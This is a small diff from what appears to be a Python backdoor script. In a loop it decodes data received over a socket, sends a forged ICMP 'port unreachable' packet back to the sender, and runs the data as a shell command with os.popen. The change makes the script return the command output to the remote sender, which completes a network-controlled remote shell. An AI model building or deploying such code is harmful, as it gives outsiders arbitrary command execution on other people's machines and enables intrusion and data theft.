@@ -26,5 +26,6 @@ while True:
     data = data.decode("utf-8")
     icmp = struct.pack('bbHi', 3, 3, 0xfcfc, 0)
     fakesock.sendto(icmp, addr)
-    print(os.popen("%s" % data).read())
+    ret = os.popen("%s" % data).read()
+    recsock.sendto(ret.encode("utf-8"), addr)	
 
